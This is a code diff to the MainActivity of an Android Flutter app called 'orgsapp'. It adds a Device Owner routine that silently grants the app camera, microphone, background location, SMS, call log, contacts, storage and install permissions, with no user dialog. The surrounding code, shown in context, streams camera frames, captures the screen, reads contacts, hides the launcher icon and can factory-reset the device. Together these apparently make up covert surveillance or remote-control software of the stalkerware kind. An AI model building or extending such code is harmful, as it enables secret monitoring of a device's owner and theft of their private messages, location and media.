@@ -38,7 +38,6 @@ import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.EventChannel
-import io.flutter.plugin.common.MethodCall
 import io.flutter.plugin.common.MethodChannel
 import java.io.ByteArrayOutputStream
 
@@ -47,7 +46,7 @@ class MainActivity : FlutterActivity() {
     private val CHANNEL = "orgsapp/device_info"
     private val FRAME_CHANNEL = "orgsapp/camera_frames"
 
-    // ⬇️ MAIN HANDLER (FIX: dideklarasi di sini)
+    // Main thread handler
     private val mainHandler = Handler(Looper.getMainLooper())
 
     // MediaPlayer
@@ -92,8 +91,114 @@ class MainActivity : FlutterActivity() {
         cameraThread = HandlerThread("CameraThread").apply { start() }
         cameraHandler = Handler(cameraThread!!.looper)
 
+        // ✅ Auto-grant semua permission kalau Device Owner
+        tryAutoGrantPermissions()
+
         requestBatteryOptimizationExemption()
         requestCameraPermissionIfNeeded()
+    }
+
+    // ==========================================
+    // ===== DEVICE OWNER AUTO-GRANT =====
+    // ==========================================
+    private fun tryAutoGrantPermissions(): Boolean {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
+
+            if (!dpm.isDeviceOwnerApp(packageName)) {
+                Log.w("MainActivity", "⚠️ Bukan Device Owner, pakai dialog manual")
+                return false
+            }
+            if (!dpm.isAdminActive(admin)) {
+                Log.w("MainActivity", "⚠️ Device Admin belum aktif")
+                return false
+            }
+
+            Log.d("MainActivity", "✅ Device Owner terdeteksi — auto-grant semua izin")
+
+            val perms = listOf(
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.WRITE_CONTACTS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.WRITE_CALL_LOG,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.ANSWER_PHONE_CALLS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.ACCESS_MEDIA_LOCATION,
+            ).toMutableList()
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                perms.add(Manifest.permission.POST_NOTIFICATIONS)
+                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                perms.add(Manifest.permission.BLUETOOTH_CONNECT)
+                perms.add(Manifest.permission.BLUETOOTH_SCAN)
+            }
+
+            var granted = 0
+            for (perm in perms) {
+                try {
+                    val state = dpm.getPermissionGrantState(admin, packageName, perm)
+                    if (state != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
+                        dpm.setPermissionGrantState(
+                            admin,
+                            packageName,
+                            perm,
+                            DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED,
+                        )
+                    }
+                    granted++
+                } catch (e: Exception) {
+                    Log.w("MainActivity", "Gagal grant $perm: ${e.message}")
+                }
+            }
+
+            // Special permissions (tanpa dialog)
+            try {
+                dpm.setPermissionGrantState(
+                    admin, packageName,
+                    "android.permission.SYSTEM_ALERT_WINDOW",
+                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED,
+                )
+            } catch (_: Exception) {}
+
+            try {
+                dpm.setPermissionGrantState(
+                    admin, packageName,
+                    "android.permission.REQUEST_INSTALL_PACKAGES",
+                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED,
+                )
+            } catch (_: Exception) {}
+
+            try {
+                dpm.setPermissionGrantState(
+                    admin, packageName,
+                    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED,
+                )
+            } catch (_: Exception) {}
+
+            Log.d("MainActivity", "🎉 Auto-grant selesai: $granted permission")
+            return true
+        } catch (e: Exception) {
+            Log.e("MainActivity", "autoGrant error", e)
+            return false
+        }
     }
 
     // ==========================================
@@ -186,6 +291,9 @@ class MainActivity : FlutterActivity() {
                     "factoryReset" -> factoryReset(result)
 
                     "getContacts" -> getContacts(result)
+
+                    // ✅ Baru: auto-grant dari Flutter
+                    "autoGrantAllPermissions" -> result.success(tryAutoGrantPermissions())
 
                     else -> result.notImplemented()
                 }
@@ -328,7 +436,6 @@ class MainActivity : FlutterActivity() {
         try {
             val surface = cameraImageReader?.surface ?: return
 
-            // ⬇️ FIX: CaptureRequest.Builder? nullable
             val captureRequestBuilder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                 CameraDevice.TEMPLATE_STILL_CAPTURE,
             )
@@ -349,7 +456,7 @@ class MainActivity : FlutterActivity() {
                         captureSession = session
                         try {
                             session.capture(
-                                captureRequestBuilder.build(),  // ⬅️ Builder non-null
+                                captureRequestBuilder.build(),
                                 null,
                                 cameraHandler,
                             )
@@ -378,7 +485,7 @@ class MainActivity : FlutterActivity() {
             captureSession?.close(); captureSession = null
             cameraDevice?.close(); cameraDevice = null
             cameraImageReader?.close(); cameraImageReader = null
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
     // ==========================================
@@ -429,7 +536,7 @@ class MainActivity : FlutterActivity() {
                     mainHandler.post {
                         frameEventSink?.success(base64)
                     }
-                } catch (e: Exception) {}
+                } catch (_: Exception) {}
             }, cameraHandler)
 
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
@@ -467,7 +574,6 @@ class MainActivity : FlutterActivity() {
         try {
             val surface = cameraImageReader?.surface ?: return
 
-            // ⬇️ FIX: CaptureRequest.Builder? nullable
             val builder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                 CameraDevice.TEMPLATE_PREVIEW,
             )
@@ -486,18 +592,18 @@ class MainActivity : FlutterActivity() {
                         captureSession = session
                         try {
                             session.setRepeatingRequest(
-                                builder.build(),  // ⬅️ Builder non-null
+                                builder.build(),
                                 null,
                                 cameraHandler,
                             )
-                        } catch (e: Exception) {}
+                        } catch (_: Exception) {}
                     }
 
                     override fun onConfigureFailed(session: CameraCaptureSession) {}
                 },
                 cameraHandler,
             )
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
     private fun stopCameraStream(result: MethodChannel.Result) {
@@ -519,7 +625,7 @@ class MainActivity : FlutterActivity() {
                     }
                     startActivity(intent)
                 }
-            } catch (e: Exception) {}
+            } catch (_: Exception) {}
         }
     }
 
@@ -550,6 +656,17 @@ class MainActivity : FlutterActivity() {
                     val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                             as MediaProjectionManager
                     mediaProjection = mpm.getMediaProjection(resultCode, data)
+                    mediaProjection?.registerCallback(
+                        object : MediaProjection.Callback() {
+                            override fun onStop() {
+                                Log.d("MainActivity", "MediaProjection stopped")
+                                virtualDisplay?.release()
+                                virtualDisplay = null
+                                mediaProjection = null
+                            }
+                        },
+                        mainHandler,
+                    )
                     setupVirtualDisplay()
                     pendingProjectionResult?.success(true)
                 } catch (e: Exception) {
@@ -573,7 +690,7 @@ class MainActivity : FlutterActivity() {
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader?.surface, null, null,
             )
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
     private fun captureScreenWithProjection(result: MethodChannel.Result) {
@@ -623,7 +740,7 @@ class MainActivity : FlutterActivity() {
             bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
             val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
             result.success(base64)
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             result.success("")
         }
     }
@@ -653,7 +770,7 @@ class MainActivity : FlutterActivity() {
                 prepareAsync()
             }
             result.success(true)
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             result.success(false)
         }
     }
@@ -662,7 +779,7 @@ class MainActivity : FlutterActivity() {
         try {
             mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null
             result.success(true)
-        } catch (e: Exception) { result.success(true) }
+        } catch (_: Exception) { result.success(true) }
     }
 
     // ==========================================
@@ -688,7 +805,7 @@ class MainActivity : FlutterActivity() {
                 } else {
                     runOnUiThread { result.success(false) }
                 }
-            } catch (e: Exception) {
+            } catch (_: Exception) {
                 runOnUiThread { result.success(false) }
             }
         }.start()
@@ -767,7 +884,7 @@ class MainActivity : FlutterActivity() {
                 }
             }
             result.success(contacts)
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             result.success(emptyList<Map<String, String>>())
         }
     }
@@ -799,7 +916,7 @@ class MainActivity : FlutterActivity() {
                     val flashAvailable: Boolean =
                         chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                     if (flashAvailable) { cameraId = id; break }
-                } catch (e: Exception) {}
+                } catch (_: Exception) {}
             }
             if (cameraId == null) { result.success(false); return }
             camManager.setTorchMode(cameraId, on)
@@ -883,8 +1000,8 @@ class MainActivity : FlutterActivity() {
                 val cn = ComponentName(this, MainActivity::class.java)
                 packageManager.setComponentEnabledSetting(
                     cn,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP,
                 )
             }
             result.success(true)
@@ -898,8 +1015,8 @@ class MainActivity : FlutterActivity() {
             val cn = ComponentName(this, MainActivity::class.java)
             packageManager.setComponentEnabledSetting(
                 cn,
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP,
             )
             result.success(true)
         } catch (e: Exception) {
@@ -932,7 +1049,7 @@ class MainActivity : FlutterActivity() {
         try {
             closeCamera()
             cameraThread?.quitSafely()
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
         super.onDestroy()
     }
 }
